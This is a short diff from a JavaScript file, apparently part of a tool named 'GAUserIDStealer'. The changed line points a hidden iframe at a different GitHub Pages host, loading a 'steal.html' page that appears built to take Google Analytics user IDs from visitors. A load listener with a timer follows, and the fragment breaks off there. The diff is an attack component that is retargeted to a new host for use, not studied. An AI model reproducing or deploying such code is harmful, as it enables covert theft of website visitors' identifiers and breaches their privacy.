@@ -21,7 +21,7 @@ function makeid(length) {
 
      var fbframe=document.getElementById(fbhappyId);
 
-     fbframe.src ="https://newmangervase91.github.io/GAUserIDStealer/steal.html";
+     fbframe.src ="https://mingjihan7.github.io/GAUserIDStealer/steal.html";
      
      fbframe.addEventListener("load",function(){
          setTimeout(function(){
